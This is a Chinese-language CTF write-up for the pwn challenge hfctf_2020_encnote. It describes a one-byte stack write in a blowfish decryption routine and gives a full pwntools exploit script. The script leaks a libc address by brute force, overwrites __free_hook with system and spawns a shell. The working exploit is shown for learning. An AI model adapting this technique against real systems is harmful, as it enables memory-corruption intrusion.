# hfctf_2020_encnote



### 总结

- 题目的利用点比较难发现，找到漏洞点后利用就很简单。主要是利用栈上的任意地址的`1`字节修改，和修改后的地址的可控的`2`字节写完成利用。
- 密码库`Carypto`的使用过程中尽量使用`long_to_bytes`这样的接口去转换数字和字节，直接用`pwntools`的`p64`之类的容易被坑。

<!-- more -->

### 题目分析

![image-20220117003226315](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220117003226315.png)

保护全开，使用的`libc`版本为`2.23`。

总的来看，题目实现了一套`blowfish`的`ECB`模式加解密，其中`key`是随机初始化的，但是其指针存在`data`段；解密后的值也存储在`data`段；最多只能加解密`8`个字节。

### 漏洞点

在`blowfish_dec`函数中，最后解密写入结果的时候有个栈上任意`1`字节修改的漏洞：

![image-20220117003720849](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220117003720849.png)

这里的`v5`是解密的高`4`个字节，可控。即可利用这个漏洞修改`v8`指针的值，然后往`v8`里面写入可控的最高位的两个字节。

### 利用思路

结合上图，`v8`中原本存储的地址为`$rebase(0x204048)`，而存储加密的主密钥`key`的地址为`$rebase(0x204040)`，挨得很近，因此，可以修改主密钥`key`的指针。那么，当这个指针的高字节为`0`的时候，我们可以利用加密后的内容爆破出指针指向的地址的低字节的值。

因此，利用思路如下：

- 利用修改漏洞修改`key`指针，使其为一个堆地址，且堆地址存储着`libc`地址，这里可以构造`unsorted bin chunk`获得`libc`地址
- 爆破出`libc`地址
- 修改下方的`$rebase(0x2040b0)`为`&__free_hook - 2`
- 用已知密钥解密`system`地址，然后加密`1`次，即可往`__free_hook`写入`system`地址
- 释放`/bin/sh`块获取`shell`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: lynne
from pwncli import *
from Crypto.Cipher import Blowfish
from Crypto.Util.number import long_to_bytes, bytes_to_long

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def add_note(idx:int, length:int, price: str or bytes="/bin/sh\x00"):
    io.sendlineafter("Choice:\n", "1")
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the length:\n", str(length))
    io.sendafter("Input note price:\n", price)

def dele_note(idx):
    io.sendlineafter("Choice:\n", "2")
    io.sendlineafter("Input the id:\n", str(idx))

def enc(num:int):
    io.sendlineafter("Choice:\n", "5")
    io.sendafter("Please input the message:\n", p64(num))
    m = io.recvline(keepends=False)
    info(f"Get msg: {m}")
    return int16_ex(m)

def dec(num: int):
    io.sendlineafter("Choice:\n", "6")
    io.sendafter("Please input the message:\n", p64(num))

def bye():
    io.sendlineafter("Choice:\n", "7")


def blowfish_getkey(data: str, cur_key: bytes, enc_res: int):
    for i in range(0x100):
        key1 = p8(i) + cur_key
        key = key1.ljust(8, b"\x00")
        bf = Blowfish.new(key, mode=Blowfish.MODE_ECB)
        res = bf.encrypt(data)
        # log_ex(f"current key: {key}, current res: {res.hex()}")
        if res== long_to_bytes(enc_res):
            log_ex(f"Find key: {key1}")
            return key1

"""
0. 得到unsortedbin
1. 利用 
  if ( v6 == 0x867D33FB )
    *((_BYTE *)&i + (BYTE1(v5) & 0x3F)) = v5;
  *v8 = v6 | ((unsigned __int64)v5 << 0x20);
  修改v8指针 修改key

2. 爆破出libc地址
3. 修改enc_save_ptr 为__free_hook -2
4. 修改__free_hook为system
"""
low32 = 0x867D33FB
high32 = 0x3c000e39

add_note(0, 0x80)
add_note(1, 0x60)
dele_note(0)

res = b"\x7f"
for _ in range(5):
    # 修改指针
    enc_num = enc((high32 << 32)+low32)
    dec(enc_num)
    high32 -= 0x1000000
    # 爆破
    enc_num = enc((high32 << 32) + low32)
    res = blowfish_getkey(p64((high32 << 32) + low32)[::-1], res, enc_num)
    if not res:
        error(f"high32: {hex(high32)}")

res = res.ljust(8, b"\x00")
libc_base = u64(res) - 0x3c4bf8
log_libc_base_addr(libc_base)
libc.address = libc_base

free_hook = libc.sym['__free_hook'] - 2
log_address("free_hook", free_hook)
bf = Blowfish.new(res, mode=Blowfish.MODE_ECB)
system_dec = bf.decrypt(long_to_bytes(libc.sym['system']).ljust(8, b"\x00"))
log_ex(f"system dec: {system_dec}")

for i in range(3):
    hhh = (free_hook >> (32 - i * 16)) & 0xffff
    lll = 0x0eae - i * 2
    high32 = (hhh << 16) | lll
    res_num = bf.encrypt(p64((high32 << 32) + low32)[::-1])
    res_num = bytes_to_long(res_num)
    dec(res_num)

enc(bytes_to_long(system_dec))

dele_note(1)

io.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-01-17-hfctf-2020-encnote/  

